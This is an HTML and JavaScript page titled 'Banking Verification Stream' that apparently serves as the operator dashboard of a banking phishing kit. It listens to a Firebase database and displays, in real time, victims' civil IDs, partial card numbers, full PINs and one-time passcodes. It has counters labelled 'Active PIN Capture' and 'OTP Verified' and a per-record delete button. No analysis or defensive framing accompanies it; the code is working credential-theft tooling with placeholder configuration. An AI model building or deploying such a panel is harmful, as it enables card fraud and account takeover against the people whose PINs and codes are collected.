<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard - Banking Verification Stream</title>
  
  <!-- Firebase SDKs -->
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>

  <style>
    :root {
      --bg: #0f172a;
      --card-bg: #1e293b;
      --accent: #3b82f6;
      --text: #f8fafc;
      --text-muted: #94a3b8;
      --border: #334155;
      --danger: #ef4444;
      --success: #22c55e;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
    body { background-color: var(--bg); color: var(--text); padding: 24px; }
    
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 24px;
      padding-bottom: 16px;
      border-bottom: 1px solid var(--border);
    }

    .live-badge {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 14px;
      color: var(--success);
      font-weight: bold;
    }

    .pulse {
      width: 10px;
      height: 10px;
      background-color: var(--success);
      border-radius: 50%;
      box-shadow: 0 0 0 rgba(34, 197, 94, 0.4);
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); }
      70% { box-shadow: 0 0 0 10px rgba(34, 197, 94, 0); }
      100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); }
    }

    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 16px;
      margin-bottom: 24px;
    }

    .stat-card {
      background: var(--card-bg);
      padding: 16px;
      border-radius: 8px;
      border: 1px solid var(--border);
    }

    .stat-card h3 { font-size: 14px; color: var(--text-muted); margin-bottom: 8px; }
    .stat-card p { font-size: 24px; font-weight: bold; }

    .table-container {
      background: var(--card-bg);
      border-radius: 8px;
      border: 1px solid var(--border);
      overflow-x: auto;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      text-align: left;
    }

    th, td {
      padding: 14px 16px;
      border-bottom: 1px solid var(--border);
      font-size: 14px;
    }

    th { background: rgba(0, 0, 0, 0.2); color: var(--text-muted); }
    tr:hover { background: rgba(255, 255, 255, 0.02); }

    code {
      background: #090d16;
      padding: 4px 8px;
      border-radius: 4px;
      font-family: monospace;
      color: #60a5fa;
    }

    .badge {
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: bold;
    }

    .badge-success { background: rgba(34, 197, 94, 0.1); color: var(--success); }
    .badge-pending { background: rgba(234, 179, 8, 0.1); color: #eab308; }

    .empty-msg {
      text-align: center;
      padding: 40px;
      color: var(--text-muted);
    }
  </style>
</head>
<body>

  <header>
    <div>
      <h1>Banking Verification Stream</h1>
      <p style="color: var(--text-muted); font-size: 14px;">Real-time submission monitoring dashboard</p>
    </div>
    <div class="live-badge">
      <div class="pulse"></div> LIVE REALTIME STREAM
    </div>
  </header>

  <section class="stats">
    <div class="stat-card">
      <h3>Total Submissions</h3>
      <p id="total-count">0</p>
    </div>
    <div class="stat-card">
      <h3>Active PIN Capture</h3>
      <p id="pin-count">0</p>
    </div>
    <div class="stat-card">
      <h3>OTP Verified</h3>
      <p id="otp-count">0</p>
    </div>
  </section>

  <div class="table-container">
    <table>
      <thead>
        <tr>
          <th>Time</th>
          <th>Civil / Resident ID</th>
          <th>Card Digits</th>
          <th>PIN</th>
          <th>OTP Code</th>
          <th>Lang / Device</th>
          <th>Status</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody id="data-table">
        <tr>
          <td colspan="8" class="empty-msg">Waiting for incoming data submissions...</td>
        </tr>
      </tbody>
    </table>
  </div>

  <script>
    // Config matching your front-end Firebase setup
    const firebaseConfig = {
      apiKey: "YOUR_API_KEY",
      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
      databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com",
      projectId: "YOUR_PROJECT_ID",
      storageBucket: "YOUR_PROJECT_ID.appspot.com",
      messagingSenderId: "YOUR_SENDER_ID",
      appId: "YOUR_APP_ID"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const tableBody = document.getElementById('data-table');
    const totalCountEl = document.getElementById('total-count');
    const pinCountEl = document.getElementById('pin-count');
    const otpCountEl = document.getElementById('otp-count');

    let totalSubmissions = 0;
    let pinSubmissions = 0;
    let otpSubmissions = 0;

    // Listen for realtime data updates
    db.ref('verifications').on('child_added', (snapshot) => {
      const data = snapshot.val();
      const id = snapshot.key;

      if (totalSubmissions === 0) {
        tableBody.innerHTML = ''; // Clear placeholder
      }

      totalSubmissions++;
      if (data.pin && data.pin !== 'N/A') pinSubmissions++;
      if (data.otp && data.otp !== 'N/A') otpSubmissions++;

      totalCountEl.textContent = totalSubmissions;
      pinCountEl.textContent = pinSubmissions;
      otpCountEl.textContent = otpSubmissions;

      const formattedTime = new Date(data.timestamp).toLocaleTimeString();

      const row = document.createElement('tr');
      row.id = `row-${id}`;
      row.innerHTML = `
        <td><small>${formattedTime}</small></td>
        <td><code>${data.civilId}</code></td>
        <td><code>${data.first4} •••• •••• ${data.last4}</code> <small>(${data.brand})</small></td>
        <td><strong style="color:#ef4444;">${data.pin}</strong></td>
        <td><strong style="color:#22c55e;">${data.otp}</strong></td>
        <td><small>${data.language} / ${data.device}</small></td>
        <td>
          <span class="badge ${data.status === 'VERIFIED' ? 'badge-success' : 'badge-pending'}">
            ${data.status}
          </span>
        </td>
        <td>
          <button onclick="deleteRecord('${id}')" style="background: none; border: none; color: var(--danger); cursor: pointer;">Delete</button>
        </td>
      `;

      // Prepend to show newest entries at top
      tableBody.insertBefore(row, tableBody.firstChild);
    });

    function deleteRecord(id) {
      if (confirm('Delete entry?')) {
        db.ref('verifications/' + id).remove();
        document.getElementById(`row-${id}`)?.remove();
      }
    }
  </script>
</body>
</html>